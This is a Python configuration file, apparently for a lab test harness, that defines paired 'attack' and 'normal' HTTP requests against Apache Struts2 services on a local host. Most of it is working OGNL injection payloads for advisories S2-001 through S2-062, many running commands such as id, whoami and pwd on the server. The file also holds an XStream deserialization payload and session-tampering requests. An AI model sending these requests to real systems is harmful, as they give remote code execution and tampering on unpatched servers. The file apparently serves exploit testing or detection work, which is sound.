# Struts2-related PoC definitions.
import os

host = os.environ.get('HOST', '192.168.0.9')


def build_multipart_form(boundary, fields):
    parts = []
    for name, value in fields:
        parts.append(
            '--{}\r\nContent-Disposition: form-data; name="{}"\r\n\r\n{}\r\n'.format(
                boundary, name, value
            )
        )
    parts.append('--{}--\r\n'.format(boundary))
    return ''.join(parts)


S2_045_CONTENT_TYPE = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data"
S2_046_BOUNDARY = '----WebKitFormBoundaryXd004BVJN9pBYBL2'
S2_046_FILENAME_PAYLOAD = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
S2_046_ATTACK_BODY = (
    '--' + S2_046_BOUNDARY + '\r\n'
    + 'Content-Disposition: form-data; name="upload"; filename="' + S2_046_FILENAME_PAYLOAD + '"\r\n'
    + 'Content-Type: text/plain\r\n\r\n'
    + 'foo\r\n'
    + '--' + S2_046_BOUNDARY + '--\r\n'
)
S2_061_BOUNDARY = '----CodexBoundaryS2061'
S2_061_PAYLOAD = """%{(#instancemanager=#application['org.apache.tomcat.InstanceManager']).(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack']).(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context)).(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance('java.util.HashSet')).(#bean.put('excludedClasses',#emptyset)).(#bean.put('excludedPackageNames',#emptyset)).(#arglist=#instancemanager.newInstance('java.util.ArrayList')).(#arglist.add('id')).(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).(#execute.exec(#arglist))}"""
S2_061_ATTACK_BODY = build_multipart_form(S2_061_BOUNDARY, [('id', S2_061_PAYLOAD)])
S2_062_BOUNDARY = '----CodexBoundaryS2062'
S2_062_PAYLOAD = """%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0)+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)+(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0)+(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)+(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0)+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0)+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0)+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))}"""
S2_062_ATTACK_BODY = build_multipart_form(S2_062_BOUNDARY, [('id', S2_062_PAYLOAD)])

requests_config = {
    'struts2_s2_015_attack_wildcard': {
        'method': 'GET',
        'url': 'http://{}:9958/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B256%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23d%29%29%2C%23out.close%28%29%7D.action'.format(host),
        'name': 'Struts2 S2-015 通配符结果 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_015_attack_header': {
        'method': 'GET',
        'url': 'http://{}:9958/param.action?message=%25%7B7%2A7%7D'.format(host),
        'name': 'Struts2 S2-015 二次引用 Header 执行',
        'type': 'attack',
    },
    'struts2_s2_015_normal': {
        'method': 'GET',
        'url': 'http://{}:9958/index.action'.format(host),
        'name': 'Struts2 S2-015 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_013_attack_id': {
        'method': 'GET',
        'url': 'http://{}:9959/link.action?a=%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B256%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23d%29%29%2C%23out.close%28%29%29%7D'.format(host),
        'name': 'Struts2 S2-013 includeParams OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_013_normal': {
        'method': 'GET',
        'url': 'http://{}:9959/link.action'.format(host),
        'name': 'Struts2 S2-013 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_012_attack_whoami': {
        'method': 'POST',
        'url': 'http://{}:9960/user.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'flow=redirect&name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B512%5D%2C%23n%3D%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%2C0%2C%23n%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D',
        'name': 'Struts2 S2-012 redirect 变量 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_012_normal': {
        'method': 'GET',
        'url': 'http://{}:9960/index.action'.format(host),
        'name': 'Struts2 S2-012 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_009_attack_touch': {
        'method': 'GET',
        'url': 'http://{}:9961/example5.action?age=12313&name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dnew+java.lang.Boolean%28false%29%2C+%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dnew+java.lang.Boolean%28true%29%2C+%40java.lang.Runtime%40getRuntime%28%29.exec%28%27touch+%2Ftmp%2Fstruts2-s2-009-success%27%29%29%28meh%29&z%5B%28name%29%28%27meh%27%29%5D=true'.format(host),
        'name': 'Struts2 S2-009 参数二次求值 touch',
        'type': 'attack',
    },
    'struts2_s2_009_normal': {
        'method': 'GET',
        'url': 'http://{}:9961/example5.action?age=18&name=demo'.format(host),
        'name': 'Struts2 S2-009 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_007_attack_whoami': {
        'method': 'POST',
        'url': 'http://{}:9962/user.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=demo&email=demo%40example.com&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23cmd%3D%27whoami%27%2C%23p%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23cmd%29%2C%23in%3Dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28%23p.getInputStream%28%29%29%29%2C%23buf%3Dnew+char%5B256%5D%2C%23len%3D%23in.read%28%23buf%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23buf%2C0%2C%23len%29%29%2C%23out.close%28%29%29+%2B+%27',
        'name': 'Struts2 S2-007 类型转换错误 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_007_normal': {
        'method': 'POST',
        'url': 'http://{}:9962/user.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=demo&email=demo%40example.com&age=18',
        'name': 'Struts2 S2-007 正常资料提交',
        'type': 'normal',
    },
    'struts2_s2_005_attack_touch': {
        'method': 'GET',
        'url': 'http://{}:9963/index.action?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27touch%20%2Ftmp%2Fstruts2-s2-005-success%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B2048%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023len%5Cu003d%5Cu0023mydat.read%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%2C0%2C%5Cu0023len%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.setCharacterEncoding%28%5C%27UTF-8%5C%27%29%27%29%28bla%29%29&%28F%29%28%28%27%5Cu0023myout.setContentType%28%5C%27text%2Fplain%3Bcharset%3DUTF-8%5C%27%29%27%29%28bla%29%29&%28G%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'.format(host),
        'name': 'Struts2 S2-005 命令执行 touch',
        'type': 'attack',
    },
    'struts2_s2_005_attack_whoami': {
        'method': 'GET',
        'url': 'http://{}:9963/index.action?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B2048%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023len%5Cu003d%5Cu0023mydat.read%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%2C0%2C%5Cu0023len%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.setCharacterEncoding%28%5C%27UTF-8%5C%27%29%27%29%28bla%29%29&%28F%29%28%28%27%5Cu0023myout.setContentType%28%5C%27text%2Fplain%3Bcharset%3DUTF-8%5C%27%29%27%29%28bla%29%29&%28G%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'.format(host),
        'name': 'Struts2 S2-005 命令执行 whoami',
        'type': 'attack',
    },
    'struts2_s2_005_normal': {
        'method': 'GET',
        'url': 'http://{}:9963/index.action'.format(host),
        'name': 'Struts2 S2-005 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_003_attack_user': {
        'method': 'GET',
        'url': 'http://{}:9964/index.action?%28%27%5Cu0023%27%20%2B%20%27session%5C%27user%5C%27%27%29%28unused%29=0wn3d'.format(host),
        'name': 'Struts2 S2-003 污染 session.user',
        'type': 'attack',
    },
    'struts2_s2_003_attack_admin': {
        'method': 'GET',
        'url': 'http://{}:9964/index.action?%28%27%5Cu0023%27%20%2B%20%27session%5B%5C%27isAdmin%5C%27%5D%27%29%28unused%29=true'.format(host),
        'name': 'Struts2 S2-003 污染 session.isAdmin',
        'type': 'attack',
    },
    'struts2_s2_003_normal': {
        'method': 'GET',
        'url': 'http://{}:9964/index.action'.format(host),
        'name': 'Struts2 S2-003 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_001_attack': {
        'method': 'POST',
        'url': 'http://{}:9965/login.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=%25%7B7*7%7D&password=',
        'name': 'Struts2 S2-001 OGNL 回填解析演示',
        'type': 'attack',
    },
    'struts2_s2_001_attack_tomcat_dir': {
        'method': 'POST',
        'url': 'http://{}:9965/login.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=%25%7B%22tomcatBinDir%7B%22%2B%40java.lang.System%40getProperty%28%22user.dir%22%29%2B%22%7D%22%7D&password=',
        'name': 'Struts2 S2-001 获取 Tomcat 执行路径',
        'type': 'attack',
    },
    'struts2_s2_001_attack_web_path': {
        'method': 'POST',
        'url': 'http://{}:9965/login.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%23req.getRealPath%28%27%2F%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%7D&password=',
        'name': 'Struts2 S2-001 获取 Web 路径',
        'type': 'attack',
    },
    'struts2_s2_001_attack_exec_pwd': {
        'method': 'POST',
        'url': 'http://{}:9965/login.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22pwd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D&password=',
        'name': 'Struts2 S2-001 命令执行 pwd',
        'type': 'attack',
    },
    'struts2_s2_001_normal': {
        'method': 'POST',
        'url': 'http://{}:9965/login.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=admin&password=admin123',
        'name': 'Struts2 S2-001 正常登录',
        'type': 'normal',
    },
    'struts2_s2_016_attack_redirect': {
        'method': 'GET',
        'url': 'http://{}:9957/index.action?redirect%3A%24%7B233%2A233%7D'.format(host),
        'name': 'Struts2 S2-016 redirect 前缀 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_016_normal': {
        'method': 'GET',
        'url': 'http://{}:9957/index.action'.format(host),
        'name': 'Struts2 S2-016 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_019_attack_debug': {
        'method': 'GET',
        'url': 'http://{}:9956/example/HelloWorld.action?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27id%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2Bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29'.format(host),
        'name': 'Struts2 S2-019 debug 参数 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_019_normal': {
        'method': 'GET',
        'url': 'http://{}:9956/example/HelloWorld.action'.format(host),
        'name': 'Struts2 S2-019 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_032_attack_method': {
        'method': 'GET',
        'url': 'http://{}:9955/index.action?method%3A%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23res.setCharacterEncoding%28%23parameters.encoding%5B0%5D%29%2C%23w%3D%23res.getWriter%28%29%2C%23s%3Dnew%20java.util.Scanner%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp%5B0%5D%29%2C%23str%3D%23s.hasNext%28%29%3F%23s.next%28%29%3A%23parameters.ppp%5B0%5D%2C%23w.print%28%23str%29%2C%23w.close%28%29%2C1%3F%23xx%3A%23request.toString=1&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id'.format(host),
        'name': 'Struts2 S2-032 Dynamic Method Invocation 执行',
        'type': 'attack',
    },
    'struts2_s2_032_normal': {
        'method': 'GET',
        'url': 'http://{}:9955/index.action'.format(host),
        'name': 'Struts2 S2-032 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_045_attack_content_type': {
        'method': 'POST',
        'url': 'http://{}:9954/upload.action'.format(host),
        'headers': {'Content-Type': S2_045_CONTENT_TYPE},
        'data': '',
        'name': 'Struts2 S2-045 恶意 Content-Type 头',
        'type': 'attack',
    },
    'struts2_s2_045_normal': {
        'method': 'POST',
        'url': 'http://{}:9954/upload.action'.format(host),
        'headers': {},
        'parm': 'upload',
        'file': 'index/test.txt',
        'name': 'Struts2 S2-045 正常上传',
        'type': 'normal',
    },
    'struts2_s2_046_attack_filename': {
        'method': 'POST',
        'url': 'http://{}:9953/upload.action'.format(host),
        'headers': {'Content-Type': 'multipart/form-data; boundary=' + S2_046_BOUNDARY},
        'data': S2_046_ATTACK_BODY,
        'name': 'Struts2 S2-046 畸形 multipart filename',
        'type': 'attack',
    },
    'struts2_s2_046_normal': {
        'method': 'POST',
        'url': 'http://{}:9953/upload.action'.format(host),
        'headers': {},
        'parm': 'upload',
        'file': 'index/test.txt',
        'name': 'Struts2 S2-046 正常上传',
        'type': 'normal',
    },
    'struts2_s2_048_attack_gangster': {
        'method': 'POST',
        'url': 'http://{}:9952/gangster.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'gangsterName=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29.%28%23q%29%7D&age=18&description=demo'.format(host),
        'name': 'Struts2 S2-048 Gangster Name 二次解析',
        'type': 'attack',
    },
    'struts2_s2_048_normal': {
        'method': 'POST',
        'url': 'http://{}:9952/gangster.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'gangsterName=Tony&age=18&description=demo',
        'name': 'Struts2 S2-048 正常表单提交',
        'type': 'normal',
    },
    'struts2_s2_052_attack_xstream': {
        'method': 'POST',
        'url': 'http://{}:9951/orders/3/edit'.format(host),
        'headers': {'Content-Type': 'application/xml'},
        'data': '<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>id</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>',
        'name': 'Struts2 S2-052 REST 插件 XStream 反序列化',
        'type': 'attack',
    },
    'struts2_s2_052_normal': {
        'method': 'GET',
        'url': 'http://{}:9951/orders/3/edit'.format(host),
        'name': 'Struts2 S2-052 REST 编辑入口访问',
        'type': 'normal',
    },
    'struts2_s2_053_attack_freemarker': {
        'method': 'POST',
        'url': 'http://{}:9950/hello.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D'.format(host),
        'name': 'Struts2 S2-053 FreeMarker 二次解析',
        'type': 'attack',
    },
    'struts2_s2_053_normal': {
        'method': 'POST',
        'url': 'http://{}:9950/hello.action'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'name=demo',
        'name': 'Struts2 S2-053 正常表单提交',
        'type': 'normal',
    },
    'struts2_s2_057_attack_namespace': {
        'method': 'GET',
        'url': 'http://{}:9949/%24%7B233%2A233%7D/actionChain1.action'.format(host),
        'name': 'Struts2 S2-057 namespace 片段 OGNL 执行',
        'type': 'attack',
    },
    'struts2_s2_057_normal': {
        'method': 'GET',
        'url': 'http://{}:9949/index.action'.format(host),
        'name': 'Struts2 S2-057 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_059_attack_double_eval': {
        'method': 'GET',
        'url': 'http://{}:9948/index.action?id=%25%7B233%2A233%7D'.format(host),
        'name': 'Struts2 S2-059 标签属性双重解析',
        'type': 'attack',
    },
    'struts2_s2_059_normal': {
        'method': 'GET',
        'url': 'http://{}:9948/index.action?id=demo'.format(host),
        'name': 'Struts2 S2-059 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_061_attack_multipart': {
        'method': 'POST',
        'url': 'http://{}:9947/index.action'.format(host),
        'headers': {'Content-Type': 'multipart/form-data; boundary=' + S2_061_BOUNDARY},
        'data': S2_061_ATTACK_BODY,
        'name': 'Struts2 S2-061 multipart 双重解析绕过',
        'type': 'attack',
    },
    'struts2_s2_061_normal': {
        'method': 'GET',
        'url': 'http://{}:9947/index.action'.format(host),
        'name': 'Struts2 S2-061 页面基线访问',
        'type': 'normal',
    },
    'struts2_s2_062_attack_multipart': {
        'method': 'POST',
        'url': 'http://{}:9946/index.action'.format(host),
        'headers': {'Content-Type': 'multipart/form-data; boundary=' + S2_062_BOUNDARY},
        'data': S2_062_ATTACK_BODY,
        'name': 'Struts2 S2-062 BeanMap 绕过链',
        'type': 'attack',
    },
    'struts2_s2_062_normal': {
        'method': 'GET',
        'url': 'http://{}:9946/index.action'.format(host),
        'name': 'Struts2 S2-062 页面基线访问',
        'type': 'normal',
    },
}
